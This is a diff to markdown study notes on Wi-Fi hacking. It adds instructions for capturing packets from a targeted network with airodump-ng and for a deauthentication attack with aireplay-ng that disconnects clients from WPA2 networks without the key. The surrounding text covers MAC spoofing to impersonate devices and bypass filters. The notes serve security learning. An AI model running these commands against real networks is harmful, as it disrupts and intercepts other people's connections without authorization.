@@ -19,7 +19,7 @@
   * Impersonate other devices
   * Bypass filters
 #### Change MAC address
-Say, we want to change the MAC address of wlan0 interface.
+Say, we want to change the MAC address of wlan0 interface. wlan0 will be used in further sections as wireless interface name.
 ```
 ifconfig (check present MAC address)
 ifconfig wlan0 down (disable interface)
@@ -52,7 +52,7 @@ arimon-ng start wlan0 (change to monitor mode)
 * airodump-ng is a packet sniffer
 * Used to capture all packets in range
 * Display detailed info about networks around us
-#### Run airodump-ng
+#### List networks running airodump-ng
 Enable monitor mode and run following.
 ```
 airodump-ng wlan0 (wlan0: monitor interface)
@@ -84,4 +84,34 @@ airodump-ng wlan0 (wlan0: monitor interface)
 airodump-ng --band a wlan0 (bands: a, b, g)
 ```
 For multiple bands: e.g. `--band abg`
+### Targeted packet sniffing
+```
+airodump-ng --bssid [BSSID] --channel [CH] --write [filename] wlan0
+```
+Files will be created with .csv, .netxml, .cap extensions. Where .cap is capture file. Can be opened with wireshark. .cap file cantains captured packets.
+### Deauthentication attack
+Disconnect any client from any network.
+* Works on encrypted networks (WEP, WPA and WPA2)
+* No need to know the network key
+* No need to connect to the network
+#### Run
+```
+iwconfig wlan0 channel [CH] (set channel number same as router)
+aireplay-ng --deauth [#DeauthPackets] -a [NetworkMAC] -c [TargetMAC] wlan0
+```
+Where
+
+#DeauthPackets: Number of deauthentication packets. 0 will represent infinite number of deauth attacks.
+
+NetworkMAC: Router MAC address
+
+TargetMAC: Client MAC address
+
+
+
+
+
+
+
+
 
